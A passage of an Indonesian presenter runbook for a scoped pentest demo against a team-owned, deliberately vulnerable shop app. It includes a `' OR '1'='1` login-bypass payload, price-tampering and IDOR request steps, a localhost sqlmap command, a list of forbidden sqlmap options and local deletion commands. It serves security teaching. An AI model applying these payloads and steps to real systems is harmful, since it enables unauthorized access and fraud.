- "Kita mulai dari yang paling terlihat: siapa yang menentukan harga?"
- "Berikutnya, apakah pembeli hanya bisa melihat pesanan miliknya?"
- "Sekarang kita lihat apakah formulir login benar-benar memeriksa password."
- "Tool otomatis bisa membantu memastikan temuan yang sama di lab terpisah."
- "Konten review juga bisa menjadi pintu masuk jika browser memperlakukannya sebagai kode."
- "Terakhir, upload file berisiko. Pada demo ini shell sengaja hanya simulasi."
- Penutup: "Pelajaran dari semuanya: validasi dan otorisasi harus dilakukan server, bukan dipercaya dari browser."

---

## 8. Tools yang akan terlihat dan alasan penggunaannya — lengkap

| Tool | Fungsi di demo | Target yang diperbolehkan | Yang tidak boleh |
| --- | --- | --- | --- |
| Burp Suite Community | Melihat, menangkap, mengubah, dan mengulang request HTTP aplikasi | Host TokoKita saja | Intruder/fuzzing otomatis di publik; tidak dibutuhkan |
| sqlmap | Membuktikan SQLi pada katalog fixture sintetis secara otomatis | `/api/lab/search` saja; localhost saja, bukan situs publik | `--dump`, `--all`, `--os-shell`, `--file-read`, `--file-write`, teknik time-based |
| Nmap | Menunjukkan deteksi service pada server demo | `127.0.0.1:8000` saja | Domain/IP Railway, subnet, semua port, opsi agresif |
| `curl` | Pemeriksaan request tunggal dan bukti cepat yang bisa diulang | Endpoint aplikasi yang tercantum | Pemindaian |
| Browser DevTools | Melihat DOM/cookie demo, mengubah nilai form pada checkout | Browser presenter yang dikendalikan tim | Menampilkan token sesi nyata |

### 8.1 Burp Suite Community — langkah demi langkah

**Menyiapkan Burp dan menangkap request:**

1. Buka Burp → **Proxy → Intercept**.
2. Pilih **Open browser** agar Firefox bawaan Burp otomatis memakai proxy Burp.
3. Buka URL TokoKita di browser itu. Halaman dan file JS/CSS akan muncul di **Proxy → HTTP history**; **Target → Site map** terisi setelah ada traffic.
4. Kalau Site map kosong, belum ada request dari browser melalui proxy. Buka/reload halaman dari browser Burp.
5. Matikan **Intercept is on** saat menjelajah normal; traffic tetap tercatat di HTTP history.
6. Filter host ke `tokokita-web-production.up.railway.app` (atau `127.0.0.1:8000` untuk lokal) supaya request demo mudah dibaca.

Aplikasi publik memakai HTTPS. Gunakan browser Burp bawaan yang sudah disiapkan. Jika browser menunjukkan peringatan sertifikat, hanya pasang Burp CA ke **profil browser khusus testing** mengikuti dokumentasi resmi PortSwigger; jangan pasang ke trust store global OS, jangan abaikan warning dengan mengirim data sensitif.

**SQLi bypass login (Burp manual):** tujuan — tunjukkan login menerima input yang mengubah logika query. Ini endpoint login utama, jangan jalankan sqlmap di endpoint ini.

1. Di browser Burp buka halaman login TokoKita.
2. Isi username `' OR '1'='1`, isi password apa saja (misalnya `demo`), lalu tekan Masuk.
3. Di Burp **Proxy → HTTP history**, cari `POST /api/login`, klik kanan → **Send to Repeater**.
4. Pada tab **Repeater**, periksa request: `Content-Type: application/json` dan body berisi `identifier` serta `password`.
5. Klik **Send**. Amati response JSON: akun hasil bypass memiliki `role: admin`.
6. Tunjukkan bahwa ini bukan password cracking: input mengubah kondisi SQL karena query menyambung string input.
7. Catatan: bentuk request bisa berbeda bila frontend berubah. Ambil request aktual dari HTTP history, jangan menebak body.

**Checkout — ubah harga di request:** tujuan — tunjukkan backend percaya harga yang dikirim client. Request ini membuat order demo baru, jadi reset sesudahnya.

1. Gunakan browser Burp dan masukkan produk laptop demo ke keranjang.
2. Buka checkout. Di Burp HTTP history cari `POST /api/checkout`.
3. Klik kanan → **Send to Repeater**.
4. Di body JSON ubah nilai `price` item laptop menjadi `100`; jangan ubah endpoint/parameter lain.
5. Klik **Send** satu kali.
6. Periksa response: total menjadi `100` dan ada nomor order baru.
7. Narasi: harga harus dihitung ulang dari database di server, bukan dipercaya dari browser.
8. Jangan mengirim berkali-kali; tiap request dapat membuat order baru.

**IDOR — akses record pesanan demo lain:** tujuan — menunjukkan server tidak memeriksa kepemilikan object.

1. Gunakan sesi pembeli demo (`rohandhika`) atau tanpa login.
2. Kirim request `GET /api/orders/201` (Host: domain TokoKita). Cara mudah: buka URL itu di browser Burp.
3. Response `200` berisi order milik Kamu, termasuk data alamat/nomor demo.
4. Batasi demonstrasi ke ID fixture `201`, `202`, atau `203`. Jangan enumerasi ID lain.
5. Narasi: autentikasi saja tidak cukup; setiap object harus dicek izin pemiliknya.

**Menjelaskan request, response, dan scope (untuk audiens):**

- **Request** menunjukkan apa yang dapat dikendalikan client: method, path, header, cookie, body.
- **Response** menunjukkan hasil server: status, JSON, `Set-Cookie`/header.
- **Repeater** mengulang satu request agar perubahan satu parameter mudah dibandingkan.
- Hindari Intruder/fuzzing otomatis pada layanan publik; tidak dibutuhkan untuk skenario ini.

### 8.2 sqlmap — latihan terisolasi lokal (lengkap)

Endpoint ini sengaja rentan, tapi menyimpan fixture dalam file SQLite terpisah `tokokita-lab.db`. Isinya hanya empat produk dummy; endpoint hanya query read-only dengan hasil maksimum 10 baris. Batas panjang parameter 4096 karakter agar payload deteksi sqlmap dapat lewat. Pengujian lokal dapat memakan waktu karena deteksi boolean-based mengirim banyak request.

**Jangan menjalankan sqlmap pada URL publik.** Jangan arahkan ke `/api/login`, `/api/orders`, atau endpoint lain. Jangan gunakan ekstraksi blind, `--dump`, `--all`, `--os-shell`, `--file-read`, `--file-write`, `--forms`, crawl, tamper, level/risk tinggi, atau banyak thread.

**Jalankan server terisolasi:**

Terminal 1:
```bash
cd ~/Projects/tokokita-web
python3 server.py --port 8000
```
Biarkan tetap hidup. Server bind default ke `127.0.0.1`.

Terminal 2, pastikan route merespons:
```bash
curl 'http://127.0.0.1:8000/api/lab/search?category=electronics'
```
Hasil yang diharapkan: dua produk, `Demo Laptop A` dan `Demo Mouse B`.

**Jalankan deteksi sqlmap** (penjelasan opsi ada di Bagian 5, Kategori 1):
```bash
sqlmap -u 'http://127.0.0.1:8000/api/lab/search?category=electronics' \
  -p category --batch --flush-session --level=1 --risk=1 \
  --technique=BEU --timeout=5 --retries=0
```
Perkiraan waktu: bisa beberapa menit karena jumlah request deteksi. Untuk demo langsung, jalankan perintah sebelum presentasi dan siapkan screenshot; gunakan `curl` untuk bukti live instan. Hentikan dengan `Ctrl+C` bila terlalu lama; tidak ada keharusan menunggu. Hasil yang diharapkan: sqlmap mengidentifikasi `category` sebagai injectable dan backend sebagai SQLite. Pada verifikasi lokal, deteksi boolean/UNION selesai dengan 46 request dalam sekitar satu detik.

**Kalau muncul banyak HTTP 400:**

- Pastikan server lokal menjalankan commit yang memiliki route `/api/lab/search` dan batas parameter 4096 karakter.
- Pastikan terminal 1 tidak menunjukkan error server.
- Jalankan `python3 tests/smoke_test.py` dari repo untuk verifikasi endpoint terisolasi.
- Jangan naikkan batas/risk atau pindah ke URL publik untuk mengatasi error.

**Menghentikan dan membersihkan uji lokal:** tekan `Ctrl+C` pada sqlmap jika masih berjalan. Untuk mematikan server lokal, tekan `Ctrl+C` di terminal 1. DB lab lokal hanya berisi fixture sintetis. Jangan pernah mengarahkan sqlmap ke DB utama toko.

### 8.3 Nmap — pemetaan port localhost (lengkap)

Nmap dipakai di sini hanya untuk menunjukkan bahwa server demo lokal membuka port HTTP. Ini bukan cara memindai aplikasi melalui domain Railway.

Terminal 1:
```bash
cd ~/Projects/tokokita-web
python3 server.py --port 8000
```

Terminal 2:
```bash
nmap -sV -p 8000 127.0.0.1
```

Arti opsi: `-sV` mencoba identifikasi service/version pada port yang dipilih; `-p 8000` membatasi ke port server lokal demo; `127.0.0.1` target loopback di laptop sendiri. Hasil yang diharapkan: hanya `8000/tcp` yang dilaporkan untuk target localhost. Server menampilkan banner demo yang meniru Apache/PHP; banner itu bukan bukti stack aslinya. Jangan ganti target menjadi domain/IP Railway, jangan scan subnet, semua port, atau opsi agresif.

### 8.4 Browser DevTools dan curl

**Checkout price tampering via DevTools** (sudah dijelaskan di Bagian 5 Kategori 3): buka checkout, DevTools → Console, `document.getElementById('priceField1').value = 100`, klik bayar sekali, UI menunjukkan total Rp100. Untuk pembuktian jaringan, buka Network tab dan lihat body `POST /api/checkout`. Jangan lakukan berkali-kali; reset data setelah selesai. Kalau ID field berubah, gunakan Burp Repeater dan ubah field `price` pada request aktual.

**curl — pemeriksaan cepat:**

```bash
# Cek route lab merespons
curl 'http://127.0.0.1:8000/api/lab/search?category=electronics'

# Cek satu order (IDOR)
curl 'http://127.0.0.1:8000/api/orders/201'

# Cek harga override (setelah reset harus kosong)
curl 'http://127.0.0.1:8000/api/prices'
```

---

## 9. Data, risiko demo publik, dan tombol berhenti

### Risiko yang perlu Kamu pahami (satu per satu)

1. **Review XSS tersimpan.** Payload akan tetap berada di database sampai di-reset. Jika pengunjung lain membuka halaman yang sama sebelum reset, browsernya dapat menjalankannya. Karena itu adegan harus singkat dan payload dihapus segera.
2. **Cookie adalah token sesi.** Jangan memperlihatkan atau menyebarkan token. Setelah demo, matikan deployment; selama masih hidup, jangan gunakan akun admin untuk hal lain.
3. **Akun demo punya password lemah.** Jangan gunakan kembali. Jangan masukkan informasi asli ke profile/review/order.
4. **Reset bukan tombol universal.** Reset memulihkan review, override harga, nama toko dan order checkout baru. Ia tidak menghapus upload atau database fixture lab. Ia juga tidak menghapus isi collector (collector ada di memori proses; yang membersihkannya adalah restart/redeploy).
5. **Upload publik dihindari.** File yang diunggah bisa tetap ada sampai redeploy/container berganti.
6. **Hosting bersama bukan scope.** Tidak ada scan port/subnet/domain Railway. Jangan memakai Nmap terhadap URL/IP publik.
7. **Deployment publik masih hidup setelah acara kalau tidak dimatikan.** Reset data tidak sama dengan mematikan deployment. Keduanya harus dilakukan: reset dulu, lalu matikan deployment (lihat Bagian 10).

### Kapan berhenti — tombol berhenti

Berhenti segera (Kamu boleh berkata "stop" kapan saja; Pelaku langsung menghentikan adegan) kalau:

- URL/host yang muncul bukan domain TokoKita.
- Ada informasi yang tampak sungguhan atau bukan data demo.
- Payload akan berjalan di browser orang yang tidak ikut presentasi.
- Ada error yang mendorong untuk memperluas scan/meningkatkan intensitas.
- Kamu meminta berhenti.

Jika ada kendala, gunakan screenshot/rekaman. Jangan mencoba target lain untuk "membuat demo berhasil".

---

## 10. Pembersihan setelah tiap latihan dan setelah acara

### Reset aplikasi

Saat login sebagai Kamu, jalankan di Console browser aplikasi:

```js
fetch('/api/seller/reset', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: '{}'
}).then(r => r.json()).then(console.log)
```

Reset ini (`POST /api/seller/reset`, hanya admin) melakukan:

- Menghapus semua review, lalu memasukkan kembali 2 ulasan seed.
- Menghapus order checkout ber-ID >= 301 (order baru dari demo checkout).
- Menghapus semua override harga (`product_prices`).
- Mengembalikan nama toko ke "TokoKita Official Store".

Setelah reset, periksa:

- [ ] `GET /api/prices` mengembalikan `{ "prices": {} }`.
- [ ] Review kembali ke seed (hanya 2 ulasan Sari dan Rohandhika di produk 1).
- [ ] Nama toko kembali normal.
- [ ] Order checkout baru hilang.

Yang **tidak** dibersihkan reset:

| Sisa setelah reset | Cara membersihkan |
| --- | --- |
| File upload | Hapus manual dari folder `uploads/`, atau redeploy |
| Isi collector | Restart atau redeploy aplikasi — collector tersimpan di memori proses |
| Database fixture lab | Tidak perlu dibersihkan; isinya empat produk dummy read-only |
| Akun yang didaftarkan saat demo | Tidak dihapus reset; hapus manual dari database kalau perlu, atau hapus `tokokita.db` dan jalankan ulang server |

Jangan simpan screenshot yang menampilkan token sesi. Collector menyimpan hasil di memori proses dan reset API toko tidak menghapus daftar itu.

**Reset total di lokal** (kalau mau benar-benar bersih): hentikan server, lalu:

```bash
rm -f tokokita.db tokokita-lab.db
find uploads -mindepth 1 -maxdepth 1 -type f -delete
```

Jalankan server lagi; database seed dibuat ulang. Jangan jalankan perintah hapus di luar direktori project lokal.

### Setelah presentasi

1. Pelaku menjalankan reset aplikasi dan memverifikasi data seed (ceklist di atas).
2. Pemilik layanan mematikan deployment Railway segera setelah presentasi selesai. Ini tindakan terpisah dari reset data — reset tidak mematikan deployment.
3. Hapus screenshot/log yang memuat cookie sesi atau informasi yang tidak perlu.
4. Pastikan URL demo tidak lagi merespons setelah shutdown.

Jangan menghapus database atau melakukan redeploy sendiri kecuali memang punya akses dan persetujuan pemilik layanan.

### Fallback saat demo (kalau ada yang gagal di panggung)

- **Site map Burp kosong:** buka/reload app dari browser Burp bawaan; cek Proxy → HTTP history.
- **Burp menahan halaman:** matikan Intercept; request tetap terekam.
- **sqlmap lama:** hentikan dengan `Ctrl+C`, tampilkan hasil lokal yang sudah direkam, lalu gunakan curl untuk response fixture. Jangan aktifkan `T` atau menaikkan intensitas.
- **Endpoint lab publik 404:** fitur belum ter-deploy atau deployment belum selesai; jangan menguji host lain. Pakai server lokal atau screenshot.
- **XSS tidak muncul:** pastikan review dikirim ke product ID yang sama dan halaman produk direload; jika tetap gagal, gunakan payload alert lokal.
- **Request checkout membuat order baru:** reset data setelah demo.
- **Upload publik tertinggal:** reset API tidak cukup. Hentikan penggunaan fitur; redeploy hanya dengan persetujuan pemilik.
- Jika satu percobaan ulang gagal, pindah ke screenshot/rekaman dan jelaskan penyebab serta mitigasi. Jangan improvisasi dengan target tambahan.

---

## 11. Pertanyaan audiens dan jawaban singkat

**"Apakah kalian benar-benar membobol Railway?"**
Tidak. Kami menguji logika aplikasi TokoKita. Hosting dan infrastrukturnya tidak dipindai.

**"Apakah shell upload bisa menjalankan Linux command?"**
Tidak. Halaman shell hanya memilih output palsu dari daftar di kode. Tidak ada command OS yang berjalan.

**"Apakah semua akun itu orang sungguhan?"**
Tidak. Akun dan record dibuat untuk demo. Tidak ada data pelanggan sungguhan yang seharusnya dimasukkan.

**"Apakah sqlmap mencuri database toko?"**
Tidak pada skenario ini. Uji sqlmap diarahkan lokal ke tabel terpisah berisi empat produk sintetis; tidak ada opsi dump.

**"Bagaimana mencegah SQL injection?"**
Gunakan prepared statements agar input selalu dianggap data, bukan bagian dari perintah SQL.

**"Apakah mengubah harga di browser berarti pembayaran sungguhan berhasil?"**
Tidak ada payment gateway atau transaksi uang sungguhan. Ini hanya menunjukkan nilai total order demo dapat dimanipulasi.

**"Apakah XSS berarti semua pengunjung pasti terkena?"**
Hanya browser yang membuka halaman dengan payload tersimpan yang memicunya. Karena itu review harus segera dibersihkan dan demo dilakukan dengan akun/browser yang dikendalikan presenter.

**"Kenapa cookie bisa dicuri? Bukannya cookie itu aman?"**
Cookie sesi di demo ini sengaja tidak memakai perlindungan `HttpOnly`, jadi JavaScript bisa membacanya. Di aplikasi nyata, cookie sesi harus `HttpOnly`, `Secure`, dan `SameSite`.

**"Katanya ada temuan di luar enam kategori itu?"**
Betul — password tersimpan tanpa hashing, cookie `user` yang bisa ditulis sendiri untuk jadi admin, error SQL yang bocor, serta checkout dan upload tanpa login. Semuanya terdokumentasi di Bagian 6 dokumen ini. Enam kategori adalah yang didemokan; temuan tambahan itu nyata, tetapi tidak kami jadikan adegan panggung.

**"Apakah demo ini legal?"**
Ya, karena ini aplikasi milik tim sendiri, pengujian dilakukan dengan izin pemilik (Kamu), semua data dummy, dan scope dibatasi hanya ke aplikasi TokoKita — bukan ke hosting, jaringan, atau sistem pihak lain.

**"Kalau aplikasinya sudah tahu rentan, kenapa tidak langsung diperbaiki saja?"**
Karena tujuan demo ini adalah menunjukkan kelemahannya, supaya audiens belajar. Perbaikannya sudah dijelaskan di setiap kategori (Bagian 5) dan temuan tambahan (Bagian 6); menambal kodenya sekarang akan mematikan adegan demo. Perbaikan adalah langkah setelah presentasi, kalau TokoKita dikembangkan jadi aplikasi sungguhan.

---

## 12. Referensi internal, catatan koreksi, dan checklist terakhir

### Referensi internal

- Panduan demo untuk Kamu (dokumen ini): `docs/runbook.md`
- Langkah teknis dan command: `docs/demo-runbook.md` — urutan rundown di dalamnya perlu diselaraskan dengan Bagian 7 dokumen ini (dokumen teknis itu masih memulai dari SQLi, sedangkan rundown resmi di sini memulai dari harga).
- Ringkasan aplikasi dan cara menjalankan: `README.md` — link panduannya perlu diperbaiki menjadi `docs/runbook.md` (sebelumnya tertulis `docs/panduan-kamu.md`, path yang tidak ada di repo).
- Spesifikasi demo: `SPEC-public-pentest-demo.md`
- Peta kapabilitas: `CAPABILITY-MAP.md`
- Repo: [TheFoolByte/tokokita-web](https://github.com/TheFoolByte/tokokita-web)
- Target publik aplikasi: `https://tokokita-web-production.up.railway.app` — hanya request HTTP(S) ke aplikasi. Jangan scan hostname/IP Railway, edge hosting, port lain, layanan metadata, atau sistem tetangga. Nmap hanya ke `127.0.0.1` di laptop tim.

### Catatan koreksi (apa yang diperbaiki dari versi sebelumnya)

| # | Yang diperbaiki | Sebelumnya | Sekarang |
| ---: | --- | --- | --- |
| 1 | Hitungan kerentanan | Berbeda-beda antar dokumen: 6 kategori / 7 baris di panduan ini, angka lain di `demo-runbook.md` dan README, sesi dihitung sebagai bagian XSS | Satu angka resmi di semua bagian dokumen ini: **6 kategori, 7 adegan**; sesi lemah adalah kategori tersendiri |
| 2 | Urutan rundown | Panduan ini mulai dari harga, `demo-runbook.md` mulai dari SQLi | Satu urutan resmi di Bagian 7: harga → IDOR → SQLi login → sqlmap → XSS → upload → mitigasi dan reset. Dokumen teknis lain perlu diselaraskan ke urutan ini |
| 3 | Link panduan di README | README menunjuk `docs/panduan-kamu.md`, path yang tidak ada di repo | Path yang benar adalah `docs/runbook.md` — README di repo masih perlu diubah ke path ini |
| 4 | Celah yang belum terdokumentasi | Lima celah tambahan ada di kode tetapi tidak disebut di runbook | Didokumentasikan di Bagian 6, tanpa mengubah kode demo |
| 5 | File `mitm_mcp_traffic.db` | Ikut ter-commit di repo tanpa penjelasan di dokumen mana pun | Sudah dihapus dari repo dan ditambahkan ke `.gitignore` (audit isinya: 1 tabel `flows`, 0 baris — skema kosong, tidak ada data) |
| 6 | Kelengkapan penjelasan | Versi sebelumnya terlalu ringkas untuk Kamu yang perlu paham proyek dari ujung ke ujung | Edisi lengkap ini: arsitektur, database, semua endpoint, semua akun/pesanan/produk, langkah tiap adegan dan tiap tool, risiko, reset, fallback, dan Q&A — supaya Kamu paham proyek ini sedetail Pelaku yang membuatnya |

### Checklist terakhir sebelum naik panggung

- [ ] Semua penyebutan jumlah sudah "6 kategori, 7 adegan" — tidak ada angka lain.
- [ ] Rundown yang dipegang Pelaku dan Kamu sama: harga → IDOR → SQLi login → sqlmap → XSS → upload → mitigasi dan reset.
- [ ] Link panduan di README repo sudah mengarah ke `docs/runbook.md`.
- [ ] Kamu bisa menjelaskan tiap kategori di Bagian 5 dengan bahasa sendiri, dan lima temuan tambahan di Bagian 6 dengan bahasa sederhana.
- [ ] Kamu tahu semua akun demo, pesanan seed, dan apa yang dilakukan tiap endpoint.
- [ ] Screenshot hasil sqlmap dan Nmap lokal sudah siap; tidak ada tool pemindaian yang dijalankan ke target publik.
- [ ] Reset sudah dicoba sekali di lokal dan hasilnya terverifikasi.
- [ ] Keputusan soal `mitm_mcp_traffic.db` sudah diambil (sudah dihapus + `.gitignore`).
- [ ] Rencana mematikan deployment setelah acara sudah jelas siapa yang menjalankan.
- [ ] Isyarat berhenti sudah disepakati; Kamu tahu dia boleh berkata "stop" kapan saja.

Semua akun dan record adalah sintetis; deployment publik hanya berlangsung sementara untuk presentasi dan harus dimatikan sesudahnya.
